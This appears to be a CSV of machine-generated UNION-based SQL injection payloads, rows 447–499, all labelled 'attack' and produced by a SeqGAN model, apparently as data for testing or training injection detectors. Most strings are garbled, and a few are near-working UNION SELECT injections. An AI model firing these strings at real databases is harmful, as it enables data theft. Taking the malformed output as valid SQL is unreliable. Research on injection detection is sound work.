label,payload,family,payload_type,method,run_id,sample_index
attack,"--- iall select null,7497,@@--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,447
attack,"-""   a4589select where null,null,null--,1297,1249--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,448
attack,"1%'  )    )   )    S    )   union all all'    ,)    )    )    )    1249 union all * 1-- u where",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,449
attack,"-3084'  )    )    )    )    union 14266  VEs'   -- all select iR(I)O   union all all select null,null,9814,null,null,null,4481,1441--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,450
attack,"1union null,43001917,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,451
attack,"-8772    )  =  2571 78159860"" union all all d1s * where ion  =n  (    )    )    ) where  =  =  =  1 all all 1917  1-- select null,null,null,null,@,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,452
attack,"-%""    --8986''    )  )    )     )    )   all all   1 union null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,453
attack,from4481')    )    )    union all \1,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,454
attack,"1""'",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,455
attack,"-24461)   )   )     )    )=)     )   i=  '1' select null,3990,2446,,9357,2446,9814,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,456
attack,"h+union 2285,@8890,1441#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,457
attack,"-""  )    )     )    )    )     )    union all all select null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,458
attack,"'  =  =  9517 2571 all select 1980,4481@,1249,@@VER)Iers ,9357,1441",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,459
attack,"1'  )    union select 8268,null,1441,3084,8986,#--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,460
attack,")    )    )    unionn union 1e,@V,v)    )   all )     )    )    )   union null,5349,9357,8986,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,461
attack,"-6097'  )    )    )    )    )    unionselect --,,7845,9357,--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,462
attack,"1'  )   union  select ,null,null,2263,null,null,null,null,8665,3480,null,8123,null--2263--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,463
attack,"-91564373""   )    )   (    union select 1--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,464
attack,"-3370"")    )    )    )     a)    )    union all 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,465
attack,"-3378')   ) '1'$  8521 .    union all select 1917,3339,7497,7497,,2446,7497,8123,2446#null,null,9814,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,466
attack,  1'  )    all all select from --,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,467
attack,"-4909""    9517   )    )    )    )    )    )     )    union all select null,null,null,null,--,null,null,6737,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,468
attack,"d7815<d  =  q-rs union all  * urs idt$)    )    )$id  8268  =  d  +N select from,4600,9988,9110,v--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,469
attack,"-  =  )    where * select 1917,@n,3596rsers @,@Vrid  1    )   )  )   )  )    )   $ =  =  1494  =  =  = union all5748 all 1917null,1297,null,8986,null,null,null,null,9814,7348,null--#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,470
attack,"1   a  )""   )  )    )    union select null,null,,9814,4300,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,471
attack,"-625337818665-- where-)    )   )    )    union all all select null,null,null,3084,null,null,null,null,null,null,3059,1249,2446,1441,3072null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,472
attack, 1494  )  =  1 id  =  1 union all all 1980 i$ where us -- ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,473
attack, -1,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,474
attack,"-3480',5131' where\a)   )    O unionall all all union 1980,null,null,1441,null,null,1441,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,475
attack,"1'    )    )    )    union =  =  (    )    )    )    )    union select null,6737,4854,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,476
attack,"-3370'""   )    )   union where i1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,477
attack,"-6996%'%  )   where 4854 mr     '    )swhere union wall -- 3084,2446,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,478
attack,"1'  =    )    )IN union allvers where where  1917  =  )    )    union select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,479
attack,"-2446  )    )    )    )    union)    )    )    )    union select ,null,null,null,null,null,3990,null,null,null,3072#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,480
attack,-4373,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,481
attack," select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,482
attack,-4338'  )    )    )   union all 1,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,483
attack,"1'N')   )    )    union null,null,3339,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,484
attack,"-'1980)   =  =1  (    )    )    )    union all 1646,2446,--,7845,7845,2263,1917--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,485
attack,1')   union null  =  =1  )    )    )   )    --va u  (    )%oi-- select null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,486
attack,"1'  )    )    )    union all select null,null--  ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,487
attack,"22634600'+  (  select ''  )    )    )    )   union select u u4600s1441oersrs ,4266,null,null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,488
attack,"-6097'''  )   )   union all all all all all -,null,7497,v7497,9357,@#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,489
attack,"1'  )    union all all all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,490
attack," Z all select 5756,8123,nulle,3480,--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,491
attack,-%',union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,492
attack,"-1297'union all all all null-- ,9357,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,493
attack,"1  s'  )    )    union all all select 4266,3339,4300,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,494
attack,-null6075)'   )    )    )    =  @  =  )    Wte 1,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,495
attack,11' )    )    )    where select' @-- wheres--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,496
attack,"3378""   )    )    )  9517'  )    as union union '1'null'  )    )  )    )    )    where id  )    )   $ where union all all select  1--seres,nullers,3084,3084--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,497
attack,"-5131J7296' -- 1  )   )   where where all select null,null,null,null,null,null,5756,null,null,3339,4481,4266,null,null,null--,4300,null,null,null,2446,9110,null,null,null,null,null,null,5349,4300,8665,null,null,null,null,3084,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,498
attack,"s 2088 geu where union null,null,1249,9988,8123,null,2446,null,8123,null,null,3072#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,499
